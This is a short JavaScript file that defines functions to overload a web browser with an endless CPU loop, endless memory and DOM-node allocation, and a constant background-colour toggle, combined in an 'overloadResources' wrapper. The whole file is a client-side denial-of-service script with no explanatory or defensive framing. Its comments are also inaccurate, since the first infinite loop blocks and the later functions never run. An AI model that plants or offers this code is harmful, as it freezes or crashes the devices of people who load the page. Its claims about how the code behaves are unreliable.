
function cpuOverload() {
    while (true) {
        
        for (let i = 0; i < 1e7; i++) { 
            Math.pow(Math.random(), Math.random());
        }
    }
}


function memoryOverload() {
    let count = 0;
    while (true) {
        let largeArray = new Array(1e6).fill(0).map(() => Math.random()); 
        let element = document.createElement('div');
        element.textContent = `Overload number: ${count++}`;
        document.body.appendChild(element); 
    }
}


function forceRepaint() {
    const body = document.body;
    while (true) {
        body.style.backgroundColor = body.style.backgroundColor === "red" ? "blue" : "red"; 
    }
}


function overloadResources() {
    cpuOverload(); // Start CPU overload
    memoryOverload(); // Start Memory overload
    forceRepaint(); // Force repaint for additional strain
}
